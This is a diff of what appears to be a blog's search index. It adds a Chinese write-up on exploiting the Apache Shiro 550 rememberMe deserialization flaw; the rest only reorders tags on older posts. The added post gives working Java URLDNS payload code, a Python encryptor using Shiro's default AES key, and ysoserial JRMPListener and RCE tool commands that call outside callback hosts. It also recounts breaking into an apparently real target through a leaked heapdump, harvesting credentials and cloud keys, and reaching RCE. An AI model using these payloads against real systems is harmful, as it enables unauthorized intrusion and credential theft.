@@ -4,6 +4,39 @@
   
   
   <entry>
+    <title>shiro550反序列化漏洞利用探究（附实战案例）</title>
+    <link href="/2026/03/06/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%A9%B6/"/>
+    <url>/2026/03/06/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8E%A2%E7%A9%B6/</url>
+    
+    <content type="html"><![CDATA[<h1 id="shiro550反序列化漏洞利用探究（附实战案例）"><a href="#shiro550反序列化漏洞利用探究（附实战案例）" class="headerlink" title="shiro550反序列化漏洞利用探究（附实战案例）"></a>shiro550反序列化漏洞利用探究（附实战案例）</h1><p>Apache Shiro 是 Apache 软件基金会旗下的开源 Java 安全框架，以易用、灵活、轻量为核心优势，核心解决认证、授权、会话管理与加密四大安全问题，适配 Web &#x2F; 非 Web、分布式等全场景，可独立使用或与 Spring 等主流框架集成。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户的登录信息加密编码，然后存储在Cookie中。对于服务端，如果检测到用户的Cookie，首先会读取rememberMe的Cookie值，然后进行base64解码，然后进行AES解密再反序列化。</p><p>那么可以构造一个cc链序列化后的字符串，并使用内置的一个默认且固定的加密 Key进行AES加密后再进行base64编码，那么这时候服务端就会去进行反序列化我们的payload内容，最终实现RCE。</p><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p>获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作</p><h3 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h3><p>Apache Shiro &lt;&#x3D; 1.2.4</p><h3 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h3><p>响应包中包含字段remember&#x3D;deleteMe字段</p><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>源码下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/apache/shiro.git<br>git checkout shiro-root-1.2.4 <span class="hljs-comment">#切换到指定版本分支</span><br></code></pre></td></tr></table></figure><p>准备对应版本环境，java1.8,tomcat9.0</p><p>具体搭建流程参考</p><p><a href="https://www.cnblogs.com/h0cksr/p/16189761.html">https://www.cnblogs.com/h0cksr/p/16189761.html</a></p><p>搭建成功后页面如下</p><p><img src="/img/image-20260203185615268.png" alt="环境搭建成功"></p><p>进行登录后响应包出现remeberMe&#x3D;deleteMe可确认为shiro框架</p><p><img src="/img/image-20260203185745859.png" alt="rememberMe&#x3D;deleteMe特征"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="出网环境下：URLDNS链探测漏洞是否存在"><a href="#出网环境下：URLDNS链探测漏洞是否存在" class="headerlink" title="出网环境下：URLDNS链探测漏洞是否存在"></a>出网环境下：URLDNS链探测漏洞是否存在</h3><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//URLDNS.java</span><br> <br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        URL url=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://e2hvmezvglr70to8gako0p6ycpig65.burpcollaborator.net&quot;</span>);<br> <br>        Class clazz=Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>);<br>        Field hashcode=clazz.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcode.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcode.set(url,<span class="hljs-number">123</span>);<br><span class="hljs-comment">//        System.out.println(hashcode.get(url));</span><br>        map.put(url,<span class="hljs-string">&quot;test&quot;</span>);<br>        hashcode.set(url,-<span class="hljs-number">1</span>);<br> <br>        serialize(map);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br> <br> <br>    &#125;<br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br> <br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object object=ois.readObject();<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心原理</strong></p><table><thead><tr><th>1</th><th>创建 <code>URL</code> 对象： <code>new URL(&quot;http://xxx.burpcollaborator.net&quot;)</code></th><th>准备触发 DNS 的载体</th></tr></thead><tbody><tr><td>2</td><td>反射获取 <code>URL.hashCode</code> 字段并设为 <code>123</code></td><td><strong>绕过本地 DNS 触发</strong>（因 <code>hashCode ≠ -1</code>）</td></tr><tr><td>3</td><td>将 <code>URL</code> 作为 key 放入 <code>HashMap</code>： <code>map.put(url, &quot;test&quot;)</code></td><td><code>HashMap.put()</code> 调用 <code>hashCode()</code>，但因已设为 123，<strong>不解析 DNS</strong></td></tr><tr><td>4</td><td>再次反射将 <code>hashCode</code> 改回 <code>-1</code></td><td><strong>恢复“未计算”状态</strong>，为反序列化做准备</td></tr><tr><td>5</td><td>序列化 <code>map</code> 到文件 <code>ser.bin</code></td><td>生成最终 payload</td></tr></tbody></table><p>然后进行 AES 加密 + Base64 编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_bin</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AES_enc</span>(<span class="hljs-params">data</span>):<br>    BS=AES.block_size<br>    pad=<span class="hljs-keyword">lambda</span> s:s+((BS-<span class="hljs-built_in">len</span>(s)%BS)*<span class="hljs-built_in">chr</span>(BS-<span class="hljs-built_in">len</span>(s)%BS)).encode()<br>    key=<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode=AES.MODE_CBC<br>    iv=uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor=AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))).decode()<br>    <span class="hljs-keyword">return</span> ciphertext<br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    data=convert_bin(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(AES_enc(data))<br></code></pre></td></tr></table></figure><p>我们将生成的base64字符串传入cookie中，并seesion删除，发送请求</p><p><img src="/img/image-20260203200536709.png" alt="URLDNS链探测成功"></p><p>说明漏洞存在</p><h3 id="不出网能回显利用"><a href="#不出网能回显利用" class="headerlink" title="不出网能回显利用"></a>不出网能回显利用</h3><p>针对不出网环境，dns和JRMP探测都没办法进行，这时候可以尝试使用回显方式进行检测，选择网站上的一个静态资源来利用</p><p><img src="/img/image-20260302150927587.png" alt="选择静态资源作为回显点"></p><p>检测到漏洞存在并成功利用</p><p><img src="/img/image-20260302151204579.png" alt="回显利用成功"></p><h3 id="不出网无回显漏洞利用"><a href="#不出网无回显漏洞利用" class="headerlink" title="不出网无回显漏洞利用"></a>不出网无回显漏洞利用</h3><p>用修改版 <code>ysoserial</code> 生成内置延时命令（如 <code>sleep 5</code>）的恶意序列化 Payload，在目标服务器反序列化时强制其主线程休眠指定时长，检测脚本通过精确比对请求发出到响应返回的时间差，若耗时显著超过正常阈值（如大于设定秒数），即可在无需目标服务器主动外连（不出网）且无命令执行结果返回（无回显）的条件下，确证漏洞存在及密钥正确。</p><p>项目：<a href="https://github.com/zhzyker/shiro-1.2.4-rce">https://github.com/zhzyker/shiro-1.2.4-rce</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> shiro-<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span>_rce.py http://<span class="hljs-number">1.1.1.1:8080</span>     <br></code></pre></td></tr></table></figure><p>成功检测到漏洞存在</p><p><img src="/img/image-20260302153111840.png" alt="延时检测成功"></p><p>执行成功</p><p><img src="/img/image-20260302153213523.png" alt="无回显执行成功"></p><h3 id="有key无利用链-JRMP"><a href="#有key无利用链-JRMP" class="headerlink" title="有key无利用链-JRMP"></a>有key无利用链-JRMP</h3><p>  已知加密密钥但目标环境缺少常见依赖库（即“无链”）时，如何利用 <strong>JRMP 协议</strong> 进行攻击的实战技巧：通过在自己控制的 VPS 上启动恶意 JRMP 监听器，诱导目标服务器连接并动态下发利用链代码，从而绕过本地依赖限制实现命令执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">java -jar shiro_tool.jar http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/samples_web_war/</span>login.jsp<br></code></pre></td></tr></table></figure><p><img src="/img/image-20260302155939272.png" alt="工具识别结果"></p><p>然后在vps上部署JRMP协议</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">java -<span class="hljs-keyword">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener <span class="hljs-number">1388</span> CommonsCollections2 <span class="hljs-comment">&quot;ping -c</span><br> <span class="hljs-number">2</span> cba7a36c.<span class="hljs-built_in">log</span>.dnslog.<span class="hljs-keyword">pp</span>.ua.<span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><p>最后在输入vps：1388</p><p>成功利用</p><p><img src="/img/image-20260302160321653.png" alt="JRMP利用成功1"></p><p><img src="/img/image-20260302160342546.png" alt="JRMP利用成功2"></p><h2 id="实战案例-pd项目"><a href="#实战案例-pd项目" class="headerlink" title="实战案例-pd项目"></a>实战案例-pd项目</h2><p>在信息收集初段对目标站点进行目录探测意外发现heapdump泄露</p><p><img src="/img/image-20260306145623496.png" alt="heapdump泄露"></p><p>随后下载下来用工具进行利用，看看有没有敏感信息</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span> <span class="hljs-keyword">JDumpSpider-1.1-SNAPSHOT-full.jar </span> heapdump<br></code></pre></td></tr></table></figure><p>除了一堆账号密码泄露外，发现存储同ak,sk</p><p><img src="/img/image-20260306150028878.png" alt="AK&#x2F;SK信息泄露"></p><p>对此尝试进行利用，但是失败了</p><p><img src="/img/image-20260306150222265.png" alt="尝试利用失败"></p><p>再回去找找发现shiro-key</p><p><img src="/img/image-20260306150459063.png" alt="发现shiro-key"></p><p>后面直接起个工具看看有没有利用链</p><p><img src="/img/image-20260306150744771.png" alt="检测利用链"></p><p>检测到利用链，后面直接rce了</p><p><img src="/img/image-20260306150844009.png" alt="RCE成功"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞挖掘</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+      <tag>Shiro</tag>
+      
+      <tag>反序列化</tag>
+      
+      <tag>RCE</tag>
+      
+      <tag>Java安全</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>实战攻防记录2-Nacos漏洞利用</title>
     <link href="/2026/02/12/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B22-Nacos%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
     <url>/2026/02/12/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B22-Nacos%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
@@ -20,6 +53,8 @@
     
     <tags>
       
+      <tag>RCE</tag>
+      
       <tag>漏洞利用</tag>
       
       <tag>Nacos</tag>
@@ -27,8 +62,6 @@
       <tag>实战攻防</tag>
       
       <tag>CVE-2021-29441</tag>
-      
-      <tag>RCE</tag>
       
       <tag>SQL注入</tag>
       
@@ -92,9 +125,9 @@
     
     <tags>
       
-      <tag>未授权访问</tag>
-      
       <tag>漏洞分析</tag>
+      
+      <tag>未授权访问</tag>
       
       <tag>SpringBoot</tag>
       
@@ -121,11 +154,11 @@
     
     <tags>
       
-      <tag>文件上传</tag>
-      
       <tag>Web安全</tag>
       
       <tag>漏洞分析</tag>
+      
+      <tag>文件上传</tag>
       
     </tags>
     
@@ -179,11 +212,11 @@
     
     <tags>
       
-      <tag>SSRF</tag>
-      
       <tag>Web安全</tag>
       
       <tag>漏洞分析</tag>
+      
+      <tag>SSRF</tag>
       
     </tags>
     
@@ -987,9 +1020,9 @@
       
       <tag>内网渗透</tag>
       
-      <tag>横向移动</tag>
-      
       <tag>多网段攻击</tag>
+      
+      <tag>横向移动</tag>
       
     </tags>
     
@@ -1016,9 +1049,9 @@
       
       <tag>内网渗透</tag>
       
-      <tag>域渗透</tag>
-      
       <tag>横向移动</tag>
+      
+      <tag>域渗透</tag>
       
     </tags>
     
